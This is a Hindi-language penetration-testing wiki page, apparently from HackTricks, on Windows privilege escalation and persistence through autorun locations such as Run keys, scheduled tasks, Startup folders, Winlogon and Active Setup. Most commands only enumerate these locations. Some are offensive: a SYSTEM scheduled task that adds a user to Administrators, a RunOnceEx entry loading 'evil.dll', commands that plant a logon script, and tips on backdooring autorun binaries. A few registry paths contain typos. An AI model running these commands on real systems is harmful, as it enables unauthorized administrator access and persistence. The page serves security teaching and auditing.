# Autoruns के साथ Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** का उपयोग **startup** पर programs चलाने के लिए किया जा सकता है। देखें कि **startup** पर चलने के लिए कौन-से binaries programmed हैं:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** को **निश्चित frequency** पर run करने के लिए schedule किया जा सकता है। देखें कि कौन-सी binaries run करने के लिए scheduled हैं:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

**Startup folders में स्थित सभी binaries startup पर execute की जाएँगी**। सामान्य Startup folders वे हैं जो नीचे सूचीबद्ध हैं, लेकिन startup folder registry में indicated होता है। [यहाँ पढ़ें कि कहाँ।](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **decompress के दौरान payloads को सीधे इन Startup folders में deposit करने**, resulting in code execution on the next user logon. For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry entry यह दर्शाती है कि आप 64-bit Windows version चला रहे हैं। Operating system इस key का उपयोग 64-bit Windows versions पर चलने वाले 32-bit applications के लिए HKEY_LOCAL_MACHINE\SOFTWARE का अलग view दिखाने हेतु करता है।

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** और **RunOnce** के रूप में ज्ञात Registry keys इस प्रकार बनाई गई हैं कि जब भी कोई user system में log in करे, programs अपने-आप execute हों। किसी key के data value के रूप में assigned command line 260 characters या उससे कम तक सीमित होती है।<sup>[[2]](#references)</sup>

**Service runs** (boot के दौरान services के automatic startup को control कर सकते हैं):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista और उसके बाद के versions में **Run** और **RunOnce** registry keys automatically generate नहीं की जातीं। इन keys की entries या तो सीधे programs start कर सकती हैं या उन्हें dependencies के रूप में specify कर सकती हैं। उदाहरण के लिए, logon पर किसी DLL file को load करने के लिए "Depend" key के साथ **RunOnceEx** registry key का उपयोग किया जा सकता है। इसे system start-up के दौरान "C:\temp\evil.dll" execute करने के लिए एक registry entry जोड़कर प्रदर्शित किया गया है:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: यदि आप **HKLM** के अंदर उल्लिखित किसी भी registry में लिख सकते हैं, तो किसी अन्य user के login करने पर आप privileges escalate कर सकते हैं।

> [!TIP]
> **Exploit 2**: यदि आप **HKLM** के अंदर किसी भी registry में निर्दिष्ट binaries को overwrite कर सकते हैं, तो किसी अन्य user के login करने पर आप उस binary को backdoor के साथ modify करके privileges escalate कर सकते हैं।
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** folder में रखे गए Shortcuts user logon या system reboot के दौरान services या applications को automatically launch करेंगे। **Startup** folder का location registry में **Local Machine** और **Current User** दोनों scopes के लिए defined होता है। इसका मतलब है कि इन specified **Startup** locations में जोड़ा गया कोई भी shortcut यह सुनिश्चित करेगा कि linked service या program logon या reboot process के बाद start हो जाए, जिससे programs को automatically run करने के लिए schedule करना एक straightforward method बन जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> यदि आप **HKLM** के अंतर्गत किसी भी \[User] Shell Folder को overwrite कर सकते हैं, तो आप उसे अपने control वाले folder की ओर point कर पाएंगे और एक backdoor रख पाएंगे, जिसे जब भी कोई user system में log in करेगा तब execute किया जाएगा, जिससे privileges escalate होंगे।
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

यह per-user registry value किसी script या command की ओर point कर सकती है, जिसे उस user के log on करने पर execute किया जाता है। यह मुख्य रूप से एक **persistence** primitive है, क्योंकि यह केवल प्रभावित user के context में run होती है, लेकिन post-exploitation और autoruns reviews के दौरान इसे check करना फिर भी उपयोगी है।<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> यदि आप current user के लिए इस value में write कर सकते हैं, तो admin rights की आवश्यकता के बिना अगले interactive logon पर execution को फिर से trigger कर सकते हैं। यदि आप इसे किसी अन्य user hive के लिए write कर सकते हैं, तो उस user के log on करने पर code execution प्राप्त कर सकते हैं।
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
नोट्स:

- Target user द्वारा पहले से readable `.bat`, `.cmd`, `.ps1`, या अन्य launcher files के लिए full paths को प्राथमिकता दें।
- यह value हटाए जाने तक logoff/reboot के बाद भी बना रहता है।
- `HKLM\...\Run` के विपरीत, यह अपने आप elevation प्रदान नहीं करता; यह user-scope persistence है।

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

आमतौर पर **Userinit** key को **userinit.exe** पर set किया जाता है। हालांकि, यदि इस key को modify किया जाता है, तो specified executable user logon के समय **Winlogon** द्वारा भी launch किया जाएगा। इसी प्रकार, **Shell** key को **explorer.exe** की ओर point करने के लिए intended किया जाता है, जो Windows का default shell है।<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> यदि आप registry value या binary को overwrite कर सकते हैं, तो आप privileges escalate कर पाएंगे।

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key को check करें।
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode Command Prompt बदलना

Windows Registry में `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` के अंतर्गत, डिफ़ॉल्ट रूप से **`AlternateShell`** value `cmd.exe` पर सेट होती है। इसका अर्थ है कि startup के दौरान जब आप "Safe Mode with Command Prompt" चुनते हैं (F8 दबाकर), तो `cmd.exe` का उपयोग किया जाता है। लेकिन, कंप्यूटर को F8 दबाकर और इसे manually चुनने की आवश्यकता के बिना इस mode में automatically start करने के लिए configure किया जा सकता है।

"Safe Mode with Command Prompt" में automatically start करने के लिए boot option बनाने के steps:<sup>[[5]](#references)</sup>

1. `boot.ini` file के attributes बदलकर read-only, system और hidden flags हटाएँ: `attrib c:\boot.ini -r -s -h`
2. Editing के लिए `boot.ini` खोलें।
3. इस तरह की line insert करें: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` में किए गए changes save करें।
5. Original file attributes फिर से लागू करें: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key बदलने से custom command shell setup किया जा सकता है, जिसका उपयोग unauthorized access के लिए संभावित रूप से किया जा सकता है।
- **Exploit 2 (PATH Write Permissions):** System **PATH** variable के किसी भी हिस्से में write permissions होने पर, विशेष रूप से `C:\Windows\system32` से पहले, custom `cmd.exe` execute किया जा सकता है, जो system के Safe Mode में start होने पर backdoor हो सकता है।
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` में write access होने से automatic Safe Mode startup सक्षम होता है, जिससे अगले reboot पर unauthorized access आसान हो जाता है।

Current **AlternateShell** setting जाँचने के लिए इन commands का उपयोग करें:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup Windows में एक feature है जो **desktop environment के पूरी तरह load होने से पहले शुरू होता है**। यह कुछ commands के execution को प्राथमिकता देता है, जिन्हें user logon आगे बढ़ने से पहले पूरा होना आवश्यक होता है। यह process Run या RunOnce registry sections जैसी अन्य startup entries के trigger होने से भी पहले होता है।

Active Setup को निम्नलिखित registry keys के माध्यम से manage किया जाता है:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

इन keys के भीतर विभिन्न subkeys मौजूद होते हैं, जिनमें प्रत्येक किसी specific component से संबंधित होता है। विशेष रुचि वाले key values में शामिल हैं:

- **IsInstalled:**
- `0` दर्शाता है कि component का command execute नहीं होगा।
- `1` का अर्थ है कि command प्रत्येक user के लिए एक बार execute होगा। `IsInstalled` value मौजूद न होने पर यही default behavior होता है।
- **StubPath:** Active Setup द्वारा execute किए जाने वाले command को define करता है। यह कोई भी valid command line हो सकती है, जैसे `notepad` launch करना।

**Security Insights:**

- किसी ऐसी key को modify या write करना, जिसमें **`IsInstalled`** `"1"` पर set हो और एक specific **`StubPath`** मौजूद हो, unauthorized command execution का कारण बन सकता है और संभावित रूप से privilege escalation हो सकती है।
- किसी भी **`StubPath`** value द्वारा referenced binary file को बदलना भी privilege escalation प्राप्त कर सकता है, यदि पर्याप्त permissions उपलब्ध हों।

Active Setup components में **`StubPath`** configurations का निरीक्षण करने के लिए, इन commands का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) का अवलोकन

Browser Helper Objects (BHOs) DLL modules होते हैं, जो Microsoft's Internet Explorer में अतिरिक्त features जोड़ते हैं। ये प्रत्येक startup पर Internet Explorer और Windows Explorer में load होते हैं। हालांकि, **NoExplorer** key को 1 पर सेट करके इनके execution को block किया जा सकता है, जिससे ये Windows Explorer instances के साथ load नहीं होते।<sup>[[1]](#references)</sup>

BHOs, Internet Explorer 11 के माध्यम से Windows 10 के साथ compatible हैं, लेकिन Microsoft Edge में supported नहीं हैं, जो Windows के नए versions में default browser है।

किसी system पर registered BHOs को explore करने के लिए, आप निम्नलिखित registry keys inspect कर सकते हैं:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

प्रत्येक BHO को registry में उसके **CLSID** द्वारा represent किया जाता है, जो एक unique identifier के रूप में कार्य करता है। प्रत्येक CLSID की detailed information `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` के अंतर्गत मिल सकती है।

Registry में BHOs को query करने के लिए, इन commands का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ध्यान दें कि registry में प्रत्येक dll के लिए 1 नया registry entry होगा और इसे **CLSID** द्वारा दर्शाया जाएगा। आप CLSID की जानकारी `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` में पा सकते हैं।

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

ध्यान दें कि वे सभी sites जहाँ आप autoruns ढूँढ सकते हैं, **पहले ही** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **द्वारा search की जा चुकी हैं**। हालांकि, **auto-executed** files की अधिक व्यापक list के लिए आप systinternals से [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) का उपयोग कर सकते हैं:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## अधिक

**[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) में registries जैसे और Autoruns खोजें**<sup>[[4]](#references)</sup>

## संदर्भ

- [1] [सामान्य malware persistence mechanisms](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [वैकल्पिक shell शुरू करने वाला boot option कैसे जोड़ें?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
